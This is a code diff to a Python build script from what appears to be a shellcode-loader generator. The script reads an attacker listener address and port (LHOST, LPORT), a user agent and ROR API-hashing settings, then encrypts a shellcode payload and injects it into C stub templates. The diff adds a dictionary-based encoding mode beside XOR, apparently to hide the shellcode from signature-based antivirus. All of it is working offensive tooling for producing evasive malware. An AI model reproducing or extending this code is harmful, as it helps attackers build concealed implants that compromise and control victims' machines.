@@ -1,6 +1,7 @@
 from configparser import ConfigParser
 from scripts.ROR import hash
 from scripts.config import parse_config
+from scripts.dict import dictionary_encrypt
 from scripts.utils import *
 import random
 import sys
@@ -10,11 +11,11 @@ config.read(".conf")
 
 # CONFIG = parse_config(config)
 
+ENCRYPTION_METHOD = config.get("Payload", "encryption_method")
 ROR_VALUE = config.getint("Payload", "ror_value")
 ENCRYPTION_KEY = config.get("Payload", "encryption_key")
 PAYLOAD_FILE = config.get("Payload", "file")
 
-# MODE = config.get("Payload","mode")
 LHOST = config.get("Payload", "lhost")
 LPORT = config.getint("Payload", "lport")
 USER_AGENT = config.get("Payload","user_agent")
@@ -40,6 +41,7 @@ def main():
     print("===========CONFIG==========")
     print(f"ROR value: {ROR_VALUE}")
     print(f"Encryption byte: {ENCRYPTION_KEY}")
+    print(f"Payload file: {PAYLOAD_FILE}")
     print("===========================\n")
 
     print("===========PAYLOAD==============")
@@ -96,6 +98,8 @@ def main():
         instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_FILE)
     elif PAYLOAD_FILE.endswith(".bin") or PAYLOAD_FILE.endswith(".raw"):
         instructions = bin2instructions(WORKING_FOLDER+PAYLOAD_FILE)
+    elif PAYLOAD_FILE.endswith(".txt"):
+        instructions = txt2instructions(WORKING_FOLDER+PAYLOAD_FILE)
     else:
         print(f"Unknown file format of the payload : {PAYLOAD_FILE}")
         sys.exit(1)
@@ -106,10 +110,24 @@ def main():
 
     # Encrypt the shellcode
     print("===========ENCRYPTION==============")
-    print(f"\nEncrypted with '{hex(ENCRYPTION_KEY)}' {int(len(instructions)/2)} bytes of instructions\n")
-    encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
+    
+    if ENCRYPTION_METHOD == "dictionary" or ENCRYPTION_METHOD == "dict":
+        print(f"\nEncrypted with dictionary\n")
+        instructions, association_table, size_payload_phrase = dictionary_encrypt(instructions)
+
+        sed_file("temp/definitions.h", "%PAYLOAD_SIZE%", str(round_pow2(size_payload_phrase)))
+        sed_file("temp/payload.c", "%SHELLCODE%", f"unsigned char payload[];\n\n{association_table}\n\nconst char* dict_payload = {instructions};")
+        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "DICT_decrypt(dict_payload);")
+    
+    else:
+        print(f"\nEncrypted with '{hex(ENCRYPTION_KEY)}' {int(len(instructions)/2)} bytes of instructions\n")
+        encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
+
+        sed_file("temp/definitions.h", "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
+        sed_file("temp/payload.c", "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
+        sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "XOR(payload,sizeof(payload),key);")
+    
     print("===================================\n")
-    sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(encrypted_instructions))
     sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", str(ENCRYPTION_KEY))
 
     
